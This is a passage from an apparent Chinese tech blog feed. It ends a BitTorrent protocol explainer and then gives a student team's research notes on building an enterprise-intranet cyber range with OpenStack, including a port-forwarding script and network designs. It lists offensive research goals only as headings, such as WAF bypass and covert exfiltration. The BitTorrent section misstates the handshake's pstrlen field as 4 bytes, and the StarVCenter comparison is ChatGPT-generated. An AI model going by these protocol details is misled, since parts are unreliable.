first）</strong>：当一个peer要下载piece时，要选取当前有最少peer持有的piece，即最稀有的piece。这也就意味着，最常见，也就是最多peer持有的piece的下载任务将会被留到最后，而最稀有的资源将首先被复制。这样做的原因是，一切种子文件的下载，在最开始都是由一个peer节点掌握了所有piece的（这很好理解，就是当还没有进行过下载任务前，种子文件一开始肯定只存在于一台终端上），在这时，为了避免所有下载者peer都尝试访问同一个piece产生的瓶颈，可让他们访问不同的piece。在之后，原始peer节点，也就是一开始掌握了所有piece的节点可能因为带宽占用问题会断开连接，彼时，如果不采用稀有度优先策略，则极有可能由于某个稀有的piece未及时遭到复制，导致该piece永久的丢失。</p><h4 id="choking-上传阻塞策略"><a href="#choking-上传阻塞策略" class="headerlink" title="choking 上传阻塞策略"></a>choking 上传阻塞策略</h4><p>​    当一个peer收到来自另一个节点的请求时，他有权拒绝该片段，该拒绝策略被称为”Choking“。Choking较为常见的发生情况是，一个peer节点默认只接收一定数量的上传请求，以保证性能。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/choke.png" alt="img"></p><p>如上图所示，上面的节点已经建立了多个连接上传信息，故此没标记为choked节点，拒绝来自下面节点的连接请求，一般来说max_uploads都被设置为4。</p><h3 id="3-BitTorrent-Peer-Protocol"><a href="#3-BitTorrent-Peer-Protocol" class="headerlink" title="3.BitTorrent Peer Protocol"></a>3.BitTorrent Peer Protocol</h3><h4 id="协议基础信息"><a href="#协议基础信息" class="headerlink" title="协议基础信息"></a>协议基础信息</h4><p>一些关于P2P协议的基础知识：</p><ol><li>从五层模型的角度讲，BitTorrent协议属于第五层，也就是应用层的协议，该协议基于<strong>tcp</strong>建立的传输层基础，常用端口为<strong>6881-6889</strong>。（注意，很多网上教程称可以基于udp协议，但实际官网文档提到不能使用udp协议）<img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230313234412293.png" alt="image-20230313234412293"></li><li>所有正在下载同一资源的结点都是对等的，结点之间相互建立的连接也是对等的，对等结点建立的连接的数据传输方向是双向的，即数据可以由任何一端发往另一端。</li><li>该协议规定的发送节点和接收节点之间是对等的该协议的安全性是基于SHA1哈希算法的，接收每接收到一个完整的 piece 之后,计算该 piece 的 SHA1 哈希并与 .torrent 文件中的 info 对应的字典的 piece 对应的 Value 的相应分段做对比, 若哈希值相等, 则说明该分片传输成功，保证了传输过程中的不可篡改性。</li><li>直接传输一个piece太大，故传输过程中, piece 会进一步分为固定大小的 slice, 对等结点使用 slice 作为最基本的数据传输单位。</li></ol><p>​    对等结点在建立完传输层连接 (如 TCP) 之后, 便开始进行 Peer Protocol 的握手,。</p><h4 id="握手协议"><a href="#握手协议" class="headerlink" title="握手协议"></a>握手协议</h4><p>握手协议内容如下：</p><ul><li>pstrlen, 该值固定为 <strong>19</strong> (十进制格式, 使用 4 字节大端字节序)</li><li>pstr, 该值为 “BitTorrent protocol”字符串 (BitTorrent 协议的关键字)</li><li>reserved, BT 协议的保留字段, 用于以后扩展用, 一般将这 8 字节全部设置为 0, 某些 BT 客户端没有正确实现协议或者使用了某种扩展而发送了不全为 0 的握手信息, 此时忽略即可</li><li>info_hash, 与请求 BT Tracker 时发送的 info_hash 参数值相同</li><li>peer_id, 与请求 BT Tracker 时发送的 peer_id 参数值相同</li></ul><p>当对方收到握手信息后，应该按照上述内容，回复一个一样格式的握手，若双方peer都对于info_hash和peer_id校验成功，则连接建立成功。</p><h4 id="传输过程"><a href="#传输过程" class="headerlink" title="传输过程"></a>传输过程</h4><p>​    数据的通用格式为 &lt;length prefix&gt;&lt;type id&gt;&lt;payload&gt;, 其中 length prefix 顾名思义是消息的长度 (即 len(type id) + len(payload)), type id (十进制整数) 指示消息的类型, 特别地, length prefix 为 0 (此时消息没有 type id 也没有 payload) 代表 Keep Alive 消息, BT 协议标准规定 Keep Alive 消息每 2 min 发送一次, 接收端忽略该消息即可, 对于其它类型的消息, 其对应的 type id 如下:</p><table><thead><tr><th><strong>Prefix</strong></th><th><strong>Message</strong></th><th><strong>Structure</strong></th><th><strong>Additional Information</strong></th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td></tr><tr><td>0</td><td>choke</td><td>&lt;len=0001&gt;&lt;id=0&gt;</td><td>Fixed length, no payload. This enables a peer to block another peers request for data.</td></tr><tr><td>1</td><td>unchoke</td><td>&lt;len=0001&gt;&lt;id=1&gt;</td><td>Fixed length, no payload. Unblock peer, and if they are still interested in the data, upload will begin.</td></tr><tr><td>2</td><td>interested</td><td>&lt;len=0001&gt;&lt;id=2&gt;</td><td>Fixed length, no payload. A user is interested if a peer has the data they require.</td></tr><tr><td>3</td><td>not interested</td><td>&lt;len=0001&gt;&lt;id=3&gt;</td><td>Fixed length, no payload. The peer does not have any data required.</td></tr><tr><td>4</td><td>have</td><td>&lt;len=0005&gt;&lt;id=4&gt;&lt;piece index&gt;</td><td>Fixed length. Payload is the zero-based index of the piece. Details the pieces that peer currently has.</td></tr><tr><td>5</td><td>bitfield</td><td>&lt;len=0001+X&gt;&lt;id=5&gt;&lt;bitfield&gt;</td><td>Sent immediately after handshaking. Optional, and only sent if client has pieces. Variable length, X is the length of bitfield. Payload represents pieces that have been successfully downloaded.</td></tr><tr><td>6</td><td>request</td><td>&lt;len=0013&gt;&lt;id=6&gt;&lt;index&gt;&lt;begin&gt;&lt;length&gt;</td><td>Fixed length, used to request a block of pieces. The payload contains integer values specifying the index, begin location and length.</td></tr><tr><td>7</td><td>piece</td><td>&lt;len=0009+X&gt;&lt;id=7&gt;&lt;index&gt;&lt;begin&gt;&lt;block&gt;</td><td>Sent together with request messages. Fixed length, X is the length of the block. The payload contains integer values specifying the index, begin location and length.</td></tr><tr><td>8</td><td>cancel</td><td>&lt;len=13&gt;&lt;id=8&gt;&lt;index&gt;&lt;begin&gt;&lt;length&gt;</td><td>Fixed length, used to cancel block requests. payload is the same as ‘request’. Typically used during ‘end game’ mode.</td></tr></tbody></table><p><strong>参考文献：</strong></p>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>企业内网模拟靶场搭建1_前期调研</title>
      <link href="/2023/03/05/%E4%BC%81%E4%B8%9A%E5%86%85%E7%BD%91%E6%A8%A1%E6%8B%9F%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA1_%E5%89%8D%E6%9C%9F%E8%B0%83%E7%A0%94/"/>
      <url>/2023/03/05/%E4%BC%81%E4%B8%9A%E5%86%85%E7%BD%91%E6%A8%A1%E6%8B%9F%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA1_%E5%89%8D%E6%9C%9F%E8%B0%83%E7%A0%94/</url>
      
        <content type="html"><![CDATA[<h1 id="企业内网模拟靶场搭建1-前期调研"><a href="#企业内网模拟靶场搭建1-前期调研" class="headerlink" title="企业内网模拟靶场搭建1_前期调研"></a>企业内网模拟靶场搭建1_前期调研</h1><p>本文旨在对企业内网搭建的模块进行划分，并给出完整的规划情况和调研所得的技术栈，汇报共7轮，于16周内完成。</p><h2 id="一、云环境搭建任务需求"><a href="#一、云环境搭建任务需求" class="headerlink" title="一、云环境搭建任务需求"></a>一、云环境搭建任务需求</h2><h3 id="1-云环境搭建"><a href="#1-云环境搭建" class="headerlink" title="1. 云环境搭建"></a>1. 云环境搭建</h3><p>云环境的目的是进行：<strong>企业网的网络架构设计</strong></p><p>网络层次：搭建包括 OS 层、虚拟化层、容器层、应用服务层等多层次的云网络环境</p><p>结合虚拟化软件，搭建模拟路由器 交换机 防火墙 安全网关 / IoT 接入设备等基础性网络环境</p><h3 id="2-攻击-amp-防御体系"><a href="#2-攻击-amp-防御体系" class="headerlink" title="2. 攻击&amp;防御体系"></a>2. 攻击&amp;防御体系</h3><p><strong>网络系统防御 ：</strong></p><ul><li>设计基于网络设备（路由器、交换机）、安全防护设备（防火墙、堡垒主机）、网络边缘接入设备（网关、VPN网关）的攻击和渗透工具集，开展攻击测试</li><li>面向网络系统的攻击，设计基于网络嗅探、网络拦截、网络检测功能的网络系统防御检测体系</li></ul><p><strong>应用设备防御：</strong></p><ul><li>设计应用系统全系列攻击工具集，开展攻击测试</li><li>设计应用系统全方位 检测防御分析工具集，针对攻击开展检测分析</li></ul><p><em><strong>云环境的攻击&amp;防御：</strong></em></p><ul><li><em>构建各个层面的漏洞发现、攻击工具集，多层次穿透技术</em></li><li><em>构建全层次的攻击检测、防御集合，用于响应和发现攻击行为</em></li></ul><p>总言之，体系化的攻击技术体系：整体框架设计、工具集构建、攻击技术研发、攻击渗透验证</p><p>体系化的防御技术体系：整体框架设计、工具集构建、安全防御技术研发、安全防御验证</p><h3 id="3-新型技术"><a href="#3-新型技术" class="headerlink" title="3.新型技术"></a>3.新型技术</h3><p><strong>新型渗透技术：</strong>3</p><ul><li>体系化的漏洞挖掘工具集构建（开源项目收集 … …）</li><li>安全防护场景的探测（在 VPN 、 WAF 、 FW 、 HTTPS 场景下，探测网络中的公开和非公开服务、拓扑 …）</li><li>绕过 WAF 、 IPS 的攻击（绕过规则检测、设备脆弱性利用）</li><li>自动化攻击渗透（扫描 攻击路径选择 漏洞攻击的组合 …）</li><li>高隐蔽性回传技术（动态域名、动态路径、匿名网络）（注：此处回传指的是，当攻击者入侵系统获取资料后，将敏感资料回传至公网，或自己的主机上的动作）</li><li>网络基础设施设备的远程攻击和控制（路由器、防火墙、 IoT设备、智能终端 的攻击和控制）</li></ul><p><strong>防御技术体系：</strong>2</p><ul><li>抗绕过 ips 、 waf 规则恶意流量的智能检测技术（对编码、压缩、混淆、加密攻击流量的检测）</li><li>C&amp;C Command and Control Server ）检测 /APT 远控、扩散和回传的检测 SSH/SSL/TSL/ICMP/UDP/SOCKS/Proxy</li><li>主机深度智能检测技术（深度脱壳检测、抗沙箱反分析、内存解密反 混淆）</li><li>未知新型攻击流量的 AI 智能检测技术</li><li>对网络基础设施设备的未知新型远程攻击控制技术的智能检测</li></ul><h2 id="二、网络拓扑搭建"><a href="#二、网络拓扑搭建" class="headerlink" title="二、网络拓扑搭建"></a>二、网络拓扑搭建</h2><p>注：本部分参考51CTO博主： <em>听雪落的光阴</em>  <a href="https://blog.51cto.com/u_14557673/2473895">相关博客</a>。</p><p>​    在学校提供的平台上搭建模拟企业架构存在的问题是：</p><ul><li>性能较差，卡顿影响操作</li><li>储存节点会随机刷新，无法可控的储存信息，环境有可能被清空</li><li>依赖于学校网络中心，随时崩溃</li></ul><p>​    在个人主机上可以通过路由器、hub等工具组成子网，并完成实验，但是专业昂搭建企业架构存在的问题是：</p><ul><li>依赖于个人主机，每次组装时间较长</li><li>个人主机大多为Windows系统，不容易完成实验需要</li><li>使用桥接（bridge）的虚拟机难以与宿主机分割，搭建复杂拓扑存在难点。</li></ul><p>​    </p><p>​    综上，经过调研后，我们最终将目光锁定在<strong>openstack</strong>技术上，下文中将继续记录尝试使用Openstack搭建平台的过程：</p><h3 id="1-Openstack调研"><a href="#1-Openstack调研" class="headerlink" title="1. Openstack调研"></a>1. Openstack调研</h3><p>关于Openstack：</p><ul><li>OpenStack起源于云计算技术；</li><li>OpenStack是一个云操作系统；</li><li>OpenStack控制三大资源：计算、网络、存储（池）；</li><li>OpenStack采取身份认证机制给予用户权限和资源；</li><li>OpenStack提供web端的可视化界面方便管理员控制；</li></ul><p>OpenStack就是一个控制计算、网络和存储资源的分布式云操作系统。</p><h4 id="Openstack整体架构"><a href="#Openstack整体架构" class="headerlink" title="Openstack整体架构"></a>Openstack整体架构</h4><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/532554e20e8efff985efca155514ed0e.png" alt="img"></p><p>​    如图，官方给出的架构将OPENSTACK体系分为多个层次，其中的每一个单词对应一个组件，其中被加粗的组件可以被视为核心的组件，未加粗的则是并非核心，按照个人需要安装的组件。</p><p><strong>核心组件功能表格：</strong></p><table><thead><tr><th>组件</th><th>项目</th><th>项目说明</th></tr></thead><tbody><tr><td>Compute（计算服务）</td><td>Nova</td><td>实施服务和关联的库，以提供对可计算资源（包括裸机，虚拟机和容器）的大规模可扩展的按需自助服务访问</td></tr><tr><td>Identity Service(认证服务)</td><td>Keystone</td><td>提供API客户端身份验证，服务发现和分布式多租户授权</td></tr><tr><td>Image Service（镜像服务）</td><td>Glance</td><td>发现，注册和检索虚拟机映像。Glance具有一个RESTful API，该API允许查询VM映像元数据以及检索实际映像。通过Glance提供的VM映像可以存储在从简单文件系统到对象存储系统（例如OpenStack Swift项目）的各种位置。</td></tr><tr><td>Networking（网络服务）</td><td>Neutron</td><td>SDN网络项目，在虚拟计算环境中交付网络即服务</td></tr><tr><td>Dashboard（仪表板）</td><td>Horizon</td><td>为OpenStack服务提供基于Web的用户界面</td></tr><tr><td>Block Storage（块存储）</td><td>Cinder</td><td>虚拟化了块存储设备的管理，并为最终用户提供了自助服务API，以请求和使用这些资源，而无需了解其存储实际部署在何处或在哪种类型的设备上。</td></tr><tr><td>Object Storage（对象存储）</td><td>Swift</td><td>高度可用的，分布式的，最终一致的对象存储。组织可以使用Swift来高效、安全和廉价地存储大量数据。</td></tr><tr><td>Telemetry（计量服务）</td><td>Ceilometer</td><td>有效收集，规范化和转换OpenStack服务产生的数据</td></tr><tr><td>Orchestration(编排服务)</td><td>Heat</td><td>基于文本文件形式的模板，为云应用程序协调基础结构资源，可以将其视为代码</td></tr><tr><td>Database Service（数据库服务）</td><td>Trove</td><td>一个数据库即服务供应关系和非关系数据库引擎</td></tr><tr><td>Data Processing（数据处理）</td><td>Sahara</td><td>为用户提供一种简单的方法来在OpenStack上预配数据处理框架（例如Hadoop，Spark和Storm）</td></tr></tbody></table><h4 id="Openstack环境搭建"><a href="#Openstack环境搭建" class="headerlink" title="Openstack环境搭建"></a>Openstack环境搭建</h4><p>​    可以自上文看出，Openstack本身只提供最基础的服务和命令行，要正常的使用Openstack一定要安装配置对应的组件，同时在配置之前，需要对网络、时间、安装源、数据库等进行手动安装，这样的工作量是及其庞大的。</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230305142931319.png" alt="image-20230305142931319" style="zoom:50%;" /><p>​    要规避安装所带来的痛苦，有一些工具可供我们使用：</p><ul><li>DevStack</li><li>PackStack</li><li>TripleO</li><li>Juju</li></ul><p>在配置过程中，存在大量系统版本报错问题，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: Package: libselinux-ruby-2.5-12.el7.x86_64 (local) Requires: libselinux-ruby-2.4.el7.x86_64</span><br></pre></td></tr></table></figure><p>如上类似的版本问题，均可以通过手动下载对应版本，在对应安装包目录下使用:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum downgrade libselinux-ruby-2.4.el7.x86_64.rpm</span><br></pre></td></tr></table></figure><p>解决。</p><p>在按照上述教程配置环境后，可以访问web界面如下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230305113157237.png" alt="image-20230305113157237"></p><hr><h3 id="2-StarVCenter调研和使用"><a href="#2-StarVCenter调研和使用" class="headerlink" title="2.StarVCenter调研和使用"></a>2.StarVCenter调研和使用</h3><h4 id="StarVCenter比较情况"><a href="#StarVCenter比较情况" class="headerlink" title="StarVCenter比较情况"></a>StarVCenter比较情况</h4><p>​    StarVCenter和OpenStack都是开源的云计算平台，它们的主要区别在于：</p><ul><li><strong>体系结构</strong>：StarVCenter是一个基于VMware vSphere的云管理平台，它使用vSphere API来管理虚拟化基础设施。而OpenStack则是一个基于多个开源组件的云管理平台，包括Nova（虚拟机管理）、Neutron（网络管理）、Cinder（存储管理）等等。</li><li><strong>支持的虚拟化技术</strong>：StarVCenter仅支持VMware的虚拟化技术，而OpenStack支持多种虚拟化技术，包括KVM、Xen、Hyper-V等等。</li><li><strong>社区规模和生态系统</strong>：OpenStack是由多家公司和组织共同开发和维护的项目，拥有一个庞大的社区和生态系统。而StarVCenter是由VMware单独开发和维护的，其社区和生态系统相对较小。</li><li><strong>功能和灵活性</strong>：OpenStack具有更高的灵活性和可扩展性，可以根据用户的需要进行自定义配置和扩展。而StarVCenter的功能相对较为简单，主要是针对VMware虚拟化环境的管理和监控。</li></ul><p>​    总之，StarVCenter更适合那些已经使用VMware虚拟化技术的企业，而OpenStack则适用于需要更高灵活性和可扩展性的企业。</p><p><em>注：上述文字通过ChatGPT生成，但是经过实验基本正确。</em></p><h4 id="StarVCenter使用体验"><a href="#StarVCenter使用体验" class="headerlink" title="StarVCenter使用体验"></a>StarVCenter使用体验</h4><p>​    StarVCenter的安装相对来说简单得多，开发者将StarVCenter使用.iso镜像封装，直接添加镜像，就能得到配置完毕的环境：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230305144338169.png" alt="image-20230305144338169" style="zoom:50%;" /><p>在环境配置完毕后，我们对其功能进行了调研和学习：</p><p>添加计算节点：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230305145557954.png" alt="image-20230305145557954"></p><p>初始化网络配置：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230305150610068.png" alt="image-20230305150610068"></p><p>添加云路由：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230305150635591.png" alt="image-20230305150635591"></p><p>添加虚拟机模板：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230305150704456.png" alt="image-20230305150704456"></p><p>添加测试虚拟机：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230305150731934.png" alt="image-20230305150731934"></p><p>完成了初步对于StarVCenter的学习使用工作后，我们发现该软件存在一定的问题。</p><h4 id="StarVCenter的不足之处"><a href="#StarVCenter的不足之处" class="headerlink" title="StarVCenter的不足之处"></a>StarVCenter的不足之处</h4><ol><li><p>starVCenter网上社区较小，通过微信开创社区不太方便：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230305152743075.png" alt="image-20230305152743075" style="zoom:33%;" /></li><li><p>StarVCenter更注重starVCenter集群在企业架构中的位置，而不是注重云环境的拓扑情况，如下图，为starVCenter在官方文档中给出的部署结构图，可以看出，官方对该软件的定位也是提供云服务的企业内部计算集群：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230305161013554.png" alt="image-20230305161013554" style="zoom:50%;" /><p>​    如下图所示，StarVCenter给出的全局仿真视图仅仅体现了储存、计算、管理网络的拓扑，但是未反应云服务拓扑因此和我们所做的事情并不对应。</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230305161524312.png" alt="image-20230305161524312" style="zoom:50%;" /></li><li><p>因此，总体来说StarVCenter在部署难易、易用性等方面都远远超越了Openstack，但由于其功能和社区所限，我们决定放弃这一方案。</p></li></ol><h3 id="3-对于Openstack学习与探索"><a href="#3-对于Openstack学习与探索" class="headerlink" title="3.对于Openstack学习与探索"></a>3.对于Openstack学习与探索</h3><h4 id="使用Openstack搭建企业靶场的可行性分析"><a href="#使用Openstack搭建企业靶场的可行性分析" class="headerlink" title="使用Openstack搭建企业靶场的可行性分析"></a>使用Openstack搭建企业靶场的可行性分析</h4><p>可以看到，知网上给出了一些关于使用Openstack搭建靶场的文献。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230305162354915.png" alt="image-20230305162354915"></p><h4 id="使用Openstack未解决的问题"><a href="#使用Openstack未解决的问题" class="headerlink" title="使用Openstack未解决的问题"></a>使用Openstack未解决的问题</h4><h5 id="网络架构配置问题"><a href="#网络架构配置问题" class="headerlink" title="网络架构配置问题"></a>网络架构配置问题</h5><p>​    由于openstack需要连接控制节点和多个计算节点，以分担控制节点资源不够的情况，他们就需要多台主机进行相连，由于openstack需要在Linux平台上部署，故只能使用虚拟机进行平台的部署，然而虚拟机之间的相连就成了问题之一；虚拟机之间相连，首先需要虚拟机内部能够访问外部网络，另一方面需要外部网络能访问到部署在虚拟机上的服务。要完成前者非常容易，而完成后者，则依赖一定的技术，原因如下：大多数的情况下，openstack软件的步数都依赖于固定的IP地址，因此使用仅主机和nat模式两张网卡进行虚拟机的配置，要让部署了openstack软件的虚拟机上的服务，能够被公共网络访问，最直接的想法就是将虚拟机桥接到网络中，该方法中，我们遇到的难题就是Openstack复杂的网络配置，Openstack本身会利用用户配置时所提供的Ip添加网桥，进行服务的搭建，导致网络变得更加复杂。另一个直接的思路就是使用端口转发技术，转发Openstack向外提供的web服务，以达成服务的外部访问：</p><p><strong>端口转发：</strong></p><p>​    调研过程中，我们考虑了两种端口转发的方式，</p><p>使用python程序进行转发</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor, protocol</span><br><span class="line"></span><br><span class="line">LOCAL_PORT = <span class="number">5000</span>  <span class="comment"># 本地端口号</span></span><br><span class="line">REMOTE_PORT = <span class="number">5000</span>   <span class="comment"># OpenStack服务端口号</span></span><br><span class="line">VM_IP = <span class="string">&#x27;192.168.6.20&#x27;</span>  <span class="comment"># 虚拟机IP地址</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForwardServer</span>(<span class="params">protocol.Protocol</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, factory</span>):</span></span><br><span class="line">        self.factory = factory</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connectionMade</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Accepted connection from <span class="subst">&#123;self.transport.getPeer()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># 连接到虚拟机的OpenStack服务</span></span><br><span class="line">        self.remote = protocol.ClientCreator(reactor, protocol.Protocol).connect((VM_IP, REMOTE_PORT))</span><br><span class="line">        self.remote.addCallback(self.remoteConnected)</span><br><span class="line">        self.remote.addErrback(self.remoteConnectionFailed)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connectionLost</span>(<span class="params">self, reason</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Connection lost: <span class="subst">&#123;reason&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(self, <span class="string">&#x27;remote&#x27;</span>):</span><br><span class="line">            self.remote.transport.loseConnection()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dataReceived</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        self.remote.transport.write(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remoteConnected</span>(<span class="params">self, remote</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Connected to <span class="subst">&#123;VM_IP&#125;</span>:<span class="subst">&#123;REMOTE_PORT&#125;</span>&quot;</span>)</span><br><span class="line">        self.remote = remote</span><br><span class="line">        self.remote.transport.registerProducer(self, <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remoteConnectionFailed</span>(<span class="params">self, failure</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Failed to connect to <span class="subst">&#123;VM_IP&#125;</span>:<span class="subst">&#123;REMOTE_PORT&#125;</span>&quot;</span>)</span><br><span class="line">        self.transport.loseConnection()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForwardServerFactory</span>(<span class="params">protocol.Factory</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">buildProtocol</span>(<span class="params">self, addr</span>):</span></span><br><span class="line">        <span class="keyword">return</span> ForwardServer(self)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    reactor.listenTCP(LOCAL_PORT, ForwardServerFactory())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Listening on localhost:<span class="subst">&#123;LOCAL_PORT&#125;</span>...&quot;</span>)</span><br><span class="line">    reactor.run()</span><br></pre></td></tr></table></figure><p>使用虚拟机自带配置进行转发：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230305172058525.png" alt="image-20230305172058525"></p><p>然而，经过试验后，这两类方式都无法完成向内访问的流量转发到虚拟机的目的，经过抓包分析：</p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230305172859372.png" alt="image-20230305172859372" style="zoom:80%;" /><p>服务存在跨域访问的情况，因此，最终还是需要使用桥接技术。</p><h5 id="Openstack使用方式学习"><a href="#Openstack使用方式学习" class="headerlink" title="Openstack使用方式学习"></a>Openstack使用方式学习</h5><p>逐步学习Openstack软件的使用，如下为指定项目添加角色用户</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/fb4b369de639745ac0f33b11c9a1155.png" alt="fb4b369de639745ac0f33b11c9a1155"></p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/d99e27fc4d86f2b175d88512217bf0e.png" alt="d99e27fc4d86f2b175d88512217bf0e" style="zoom: 50%;" /><h2 id="三、常见企业网络架构"><a href="#三、常见企业网络架构" class="headerlink" title="三、常见企业网络架构"></a>三、常见企业网络架构</h2><h3 id="1-小型企业网络"><a href="#1-小型企业网络" class="headerlink" title="1.小型企业网络"></a><strong>1.小型企业网络</strong></h3><p><img src="https://pic1.zhimg.com/80/v2-77f69fbd69fab5602a5211b55e237a28_720w.webp" alt="https://pic1.zhimg.com/80/v2-77f69fbd69fab5602a5211b55e237a28_720w.webp"></p><p>​    小型企业的网络架构中，把各个部门划分为独立的vlan并设置一个单独的子网网段，接入层网络使用2层交换机，汇聚及核心层网络使用园区级3层交换机，在各个子网间进行数据转发，最后通过防火墙连接到互联网；这样做的目的是使各个部门网络访问相对独立，便于各个部门设置专属的网络访问需求；各功能模块相对独立，从逻辑层来看清晰明了，方便后期运维及故障排查。</p><p><strong>设备：</strong>FW（防火墙）-交换机-PC服务器-办公PC-AP（无线网设备）-AC（无线接入AP控制器）-无线设备</p><h4 id="路由器和交换机的区别"><a href="#路由器和交换机的区别" class="headerlink" title="路由器和交换机的区别"></a>路由器和交换机的区别</h4><ol><li>交换机工作于 TCP/IP 协议的数据链路层（2层），路由器工作于网络层（3层）。</li><li>交换机的每一个端口对应一个mac地址；路由器接入了几个网络，就有几个IP地址，负责连接不同网络（一般为内-外网）；</li><li>有些路由器提供了防火墙的服务，交换机不能提供该功能。路由器仅仅转发特定地址的数据包，不传送不支持路由协议的数据包传送和未知目标网络数据包的传送，从而可以防止广播风暴。</li></ol><h4 id="无线和有线传输的区别"><a href="#无线和有线传输的区别" class="headerlink" title="无线和有线传输的区别"></a>无线和有线传输的区别</h4><ol><li>物理层协议：有线网络通常使用的是以太网协议（Ethernet Protocol），而无线网络则使用的是Wi-Fi协议（Wireless Fidelity Protocol），这两种协议在物理层上的传输方式不同。</li><li>链路层协议：有线网络使用的是MAC地址（Media Access Control Address）来标识设备的身份，而无线网络则使用的是MAC地址和SSID（Service Set Identifier）来标识设备的身份。</li><li>网络层协议：有线网络和无线网络使用的网络层协议是一致的，都使用的是IP协议（Internet Protocol）来实现数据包的传输。</li></ol><p>总而言之，在网络层以下存在区别，而网络层以上不存在，即AP就是无线交换机。</p><h4 id="网络架构设计"><a href="#网络架构设计" class="headerlink" title="网络架构设计"></a>网络架构设计</h4><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20230305181451165.png" alt="image-20230305181451165"></p><h3 id="2-最常见三层架构网络（大型企业网络架构）"><a href="#2-最常见三层架构网络（大型企业网络架构）" class="headerlink" title="2.最常见三层架构网络（大型企业网络架构）"></a><strong>2.最常见三层架构网络（大型企业网络架构）</strong></h3><p><strong>物理网络拓扑：</strong>采用简单的三层架构，接入-汇聚-核心；</p><p><img src="https://pic2.zhimg.com/80/v2-e9ab66f45b5688fa8fbd4e9ef30fb2e1_720w.webp" alt="https://pic2.zhimg.com/80/v2-e9ab66f45b5688fa8fbd4e9ef30fb2e1_720w.webp"></p><ol><li><p><strong>核心层</strong></p><p>核心层是企业网络的中心，连接着汇聚层和其他远程网段，承担着高速数据传输的任务。在核心层中通常采用高速交换机、路由器等设备，保证网络传输速度和可靠性。通常三个以上部门规模的园区网建议规划核心层。针对无线网络，核心层包括WAC，WAC通过CAPWAP（Control and Provisioning of Wireless Access 